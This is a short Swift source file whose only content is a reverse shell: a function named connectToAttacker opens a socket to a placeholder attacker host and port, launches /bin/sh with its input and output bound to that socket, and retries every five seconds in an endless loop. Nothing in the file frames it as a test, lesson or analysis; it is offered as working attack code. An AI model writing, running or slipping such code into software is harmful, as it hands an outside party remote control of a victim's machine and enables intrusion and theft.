import Foundation

func connectToAttacker() {
    let attackerIP = "attacker_ip"
    let attackerPort: UInt16 = 0000

    while true {
        do {
            let socket = try Socket.create()
            try socket.connect(to: attackerIP, port: attackerPort)

            let process = Process()
            process.launchPath = "/bin/sh"
            process.standardInput = socket.asFileHandle()
            process.standardOutput = socket.asFileHandle()
            process.standardError = socket.asFileHandle()

            process.launch()
            process.waitUntilExit()

        } catch {
            print("Connection failed: \(error)")
            Thread.sleep(forTimeInterval: 5)
        }
    }
}

connectToAttacker()